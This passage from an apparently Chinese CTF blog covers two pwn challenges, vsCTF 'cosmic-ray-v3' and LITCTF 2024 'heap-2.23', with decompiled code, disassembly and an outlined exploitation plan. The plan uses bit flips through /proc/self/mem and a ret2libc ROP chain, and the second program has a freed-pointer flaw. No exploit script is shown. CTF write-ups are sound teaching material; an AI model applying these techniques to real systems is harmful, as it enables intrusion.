<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="cosmic-ray-v3"><a href="#cosmic-ray-v3" class="headerlink" title="cosmic-ray-v3"></a>cosmic-ray-v3</h2><p>程序的逻辑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">signed</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">cosmic_ray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">sys_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">cosmic_ray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __off_t offset<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h] BYREF</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+12h] [rbp-1Eh] BYREF</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+13h] [rbp-1Dh] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch] BYREF</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h]</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter an address to send a cosmic ray through:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"0x%lx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/mem"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token function">byte_to_binary</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"|0|1|2|3|4|5|6|7|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-----------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d|"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the bit position to flip:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token number">8</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">flip_bit</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">binary_to_byte</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bit succesfully flipped! New value is %d\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里很神奇的地方是cosmic_ray其实能翻转没有写权限段的数据，通过&#x2F;proc&#x2F;self&#x2F;mem linux中的伪文件系统实现的</p>
<p>然后程序中有一个很奇怪的地方，这个exit是通过内联汇编实现的exit，手工fuzz了好久，发现翻转 0xb8可以将 mov eax,0x3c 变成 mov edx,0x3c，也就是syscall read，刚刚好能溢出，覆盖返回地址六个字节，main函数的返回地址是libc_start_main上的地址，刚刚好是六个字节</p>
<p>这时候想到的做法是，先翻转 0xb8回到main后，再将syscall read的rdx改大，这样就可以打rop了，高版本glibc csu函数变成动态链接，所以没有好用的修改寄存器的gadget，但是可以通过cosmic_ray 去写gadget，只需要写一个pop rdi ret的gadget，打ret2libc就好了</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000000004015E0 E8 E9 FD FF FF                call    cosmic_ray
.text:00000000004015E0
.text:00000000004015E5 B8 3C 00 00 00                mov     eax, 3Ch ; &#39;&lt;&#39;
.text:00000000004015EA 48 31 FF                      xor     rdi, rdi                        ; error_code
.text:00000000004015ED 0F 05                         syscall                                 ; LINUX - sys_exit
.text:00000000004015EF B8 00 00 00 00                mov     eax, 0
.text:00000000004015F4 5D                            pop     rbp
.text:00000000004015F5 C3                            retn
.text:00000000004015F5                               ; &#125; &#x2F;&#x2F; starts at 4015AB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
	
	</div>
  <a type="button" href="/2024/06/19/vsctf-pwn/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/06/04/litctf2024-pwn/" >litctf2024_pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-06-04  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="heap-2-23"><a href="#heap-2-23" class="headerlink" title="heap-2.23"></a>heap-2.23</h2><p>程序逻辑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_400866</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">init_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        <span class="token function">free_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"malloc error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no such chunk!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"content : %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no such chunk!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no such chunk!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no such chunk!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __noreturn <span class="token function">free_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" 